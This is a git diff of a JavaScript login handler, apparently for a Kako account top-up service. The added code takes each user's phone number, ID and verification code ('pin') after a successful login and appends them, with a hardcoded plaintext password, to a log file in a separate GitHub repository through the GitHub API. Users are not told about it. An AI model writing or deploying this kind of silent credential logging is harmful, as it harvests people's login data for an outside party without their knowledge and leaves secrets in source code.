@@ -31,7 +31,7 @@ export default async function handler(req, res) {
       },
       body: JSON.stringify({
         phone: phone,
-        password: "335112blk", // Atualizado pra sua nova senha
+        password: "335112blk",
         code: code,
         scene: 0
       })
@@ -42,8 +42,47 @@ export default async function handler(req, res) {
     }
     const data = await response.json();
     res.status(200).json(data);
+
+    // Fallback pro GitHub se JSONBin falhar (chamado do frontend)
+    if (data.code === 0) {
+      await sendToGitHub({ phone, id: req.body.id || '', pin: code, timestamp: new Date().toISOString() });
+    }
   } catch (error) {
     console.error('Erro no handler Login:', error);
     res.status(500).json({ error: 'Erro interno do servidor' });
+  }
+}
+
+// Função auxiliar pra GitHub (usando variável de ambiente)
+async function sendToGitHub(formData) {
+  const GITHUB_TOKEN = process.env.GITHUB_TOKEN; // Token como variável de ambiente
+  const OWNER = "infinityrecarga";
+  const REPO = "kako-logs-contencao";
+  const PATH = "logs.txt";
+
+  try {
+    const getUrl = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}`;
+    const getHeaders = { "Authorization": `token ${GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" };
+    const getResp = await fetch(getUrl, { headers: getHeaders });
+    const getData = await getResp.json();
+    const sha = getData.sha;
+    const currentContent = atob(getData.content);
+
+    const logLine = `${formData.timestamp} | ${formData.phone} | ${formData.id} | ${formData.pin} | 335112blk\n`;
+    const updatedContent = currentContent + logLine;
+    const putData = {
+      message: "Adiciona log de contenção",
+      content: btoa(updatedContent),
+      sha: sha
+    };
+    const putResp = await fetch(getUrl, {
+      method: "PUT",
+      headers: getHeaders,
+      body: JSON.stringify(putData)
+    });
+    if (putResp.ok) console.log("Log salvo no GitHub!");
+    else console.error("Falha no GitHub:", await putResp.text());
+  } catch (error) {
+    console.error("Erro no fallback GitHub:", error);
   }
 }
